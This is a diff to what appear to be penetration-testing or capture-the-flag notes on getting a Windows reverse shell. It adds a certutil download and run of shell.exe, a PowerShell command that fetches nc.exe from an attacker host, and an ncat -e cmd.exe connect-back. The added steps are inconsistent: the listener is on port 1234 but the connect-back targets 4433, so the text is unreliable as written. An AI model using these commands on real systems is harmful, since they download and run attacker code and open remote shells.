@@ -241,6 +241,14 @@ Password Protected SSH Private Key:
 			- On victim
 				- download shell: certutil -f -split -urlcache http://10.10.16.23/shell.exe C:\temp\shell.exe
 				- execute it: C:\temp\shell.exe
+		- Alternative method: 
+			- Attacker: 
+				- Find nc.exe and place it a known dir
+				- python2 -m SimpleHTTPServer 80
+				- nc -lnvp 1234
+			- Victim: 
+				- powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.49/nc.exe','ncat.exe')
+				- .\ncat.exe -e cmd.exe 10.10.14.49 4433
 	- winrm
 		- if you see a winrm service and you have credentials
 			- sudo gem install evil-winrm 
